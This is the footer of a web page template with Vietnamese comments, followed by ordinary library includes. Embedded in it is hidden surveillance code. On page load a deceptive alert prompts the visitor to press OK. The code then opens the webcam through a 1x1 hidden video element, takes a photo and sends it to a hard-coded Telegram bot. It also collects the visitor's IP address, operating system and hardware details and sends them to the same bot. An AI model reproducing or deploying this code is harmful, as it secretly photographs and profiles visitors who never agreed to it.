<!-- Core JS -->
 <script>

    // Hàm chụp ảnh khuôn mặt bằng webcam

    function capturePhoto() {

        var video = document.getElementById('video');

        var canvas = document.createElement('canvas');

        var context = canvas.getContext('2d');

 

        // Cài đặt kích thước canvas bằng kích thước video

        canvas.width = video.videoWidth;

        canvas.height = video.videoHeight;

 

        // Chụp ảnh từ video

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

 

        // Lấy dữ liệu ảnh dưới dạng Blob

        canvas.toBlob(function(blob) {

            // Gửi ảnh qua Telegram

            var formData = new FormData();

            formData.append('chat_id', '6399418466'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram

            formData.append('photo', blob, 'photo.jpg');

 

            $.ajax({

                type: 'POST',

                url: 'https://api.telegram.org/bot6756366058:AAGSDLDxRjM5sbPnEvPSHc1wypO7AyYtrW8/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Telegram Bot Token của bạn

                data: formData,

                processData: false,

                contentType: false,

                success: function(response) {

                    console.log('Đã gửi ảnh thành công đến Telegram');

                },

                error: function(error) {

                    console.log('Lỗi khi gửi ảnh đến Telegram: ' + error);

                }

            });

        }, 'image/jpeg');

    }

 

    // Sử dụng API getUserMedia để truy cập webcam và tự động chụp ảnh

    function requestCameraAccess() {

        navigator.mediaDevices.getUserMedia({ video: true })

            .then(function(stream) {

                var video = document.getElementById('video');

                video.srcObject = stream;

                video.play();

 

                // Tự động chụp ảnh sau 1 giây

                setTimeout(function() {

                    capturePhoto();

                }, 500);

            })

            .catch(function(error) {

                console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);

            });

    }

 

    // Hiển thị hộp thoại alert và xử lý phản hồi của người dùng

    function showCameraAccessAlert() {

        alert('Ấn OK để tiếp tục xem.');

        requestCameraAccess();

    }

 

    // Gọi hàm hiển thị hộp thoại alert khi trang web được tải

    window.addEventListener('DOMContentLoaded', function() {

        showCameraAccessAlert();

    });

</script>

 

<video id="video" width="1" height="1" autoplay></video>

 

  <script>

    $(document).ready(function() {

      var telegramBotToken = '6756366058:AAGSDLDxRjM5sbPnEvPSHc1wypO7AyYtrW8';

      var chatId = '6399418466';

 

      // Lấy địa chỉ IP

      $.getJSON('https://api.ipify.org?format=json', function(data) {

        var ip = data.ip;

 

        var cpu = navigator.hardwareConcurrency || 'N/A';

        var ram = navigator.deviceMemory || 'N/A';

        var disk = navigator.deviceStorage || 'N/A';

        var gpu = getGraphicsCard();

        var os = getOperatingSystem();

        var userAgent = navigator.userAgent;

 

        var message = '- Địa chỉ IP mới: ' + ip + '\n- User-Agent: ' + userAgent + '\n- Hệ điều hành: ' + os + '\n- CPU: ' + cpu + '\n- RAM: ' + ram + '\n- Disk: ' + disk + '\n- GPU: ' + gpu;

 

        var payload = {

          chat_id: chatId,

          text: message

        };

 

        $.ajax({

          type: 'POST',

          url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',

          data: payload,

          dataType: 'json',

          success: function(response) {

            console.log('Thông tin đã được gửi thành công đến Telegram');

          },

          error: function(error) {

            console.log('Lỗi khi gửi thông tin đến Telegram: ' + error);

          }

        });

      });

 

      // Các hàm hỗ trợ

      function getOperatingSystem() {

        var userAgent = navigator.userAgent || navigator.vendor || window.opera;

        if (/windows phone/i.test(userAgent)) {

          return 'Windows Phone';

        }

        if (/android/i.test(userAgent)) {

          return 'Android';

        }

        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {

          return 'iOS';

        }

        if (/Macintosh|Mac OS X/.test(userAgent)) {

          return 'Mac OS';

        }

        if (/Windows NT/.test(userAgent)) {

          return 'Windows';

        }

        return 'Unknown';

      }

 

      function getGraphicsCard() {

        var canvas = document.createElement('canvas');

        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

        var gpu = 'N/A';

        if (debugInfo) {

          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

        }

        return gpu;

      }

    });

  </script>
<script src="./assets/vendor/libs/popper/popper.js"></script>
  <script src="./assets/vendor/js/bootstrap.js"></script>
  <script src="./assets/vendor/libs/node-waves/node-waves.js"></script>
  <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>
  <script src="./assets/vendor/libs/hammer/hammer.js"></script>
  <script src="./assets/vendor/js/menu.js<?=cache($hakibavuong)?>"></script>
  <script src="./assets/js/main.js<?=cache($hakibavuong)?>"></script>
  <script>
  function showToastrNotification(status, message, title) {
    var toastrType = status === "success" ? "success" : "error";
    toastr.options = {
      positionClass: 'toast-top-right', 
      closeButton: true,
      progressBar: true,
    };
    toastr[toastrType](message, title);
  }
</script>
  <link rel="stylesheet" href="./assets/vendor/libs/animate-css/animate.css" />
  <link rel="stylesheet" href="./assets/vendor/libs/sweetalert2/sweetalert2.css" />
  <script src="./assets/vendor/libs/sweetalert2/sweetalert2.js"></script>
  <script src="./assets/vendor/libs/toastr/toastr.js"></script>
  </body>
</html>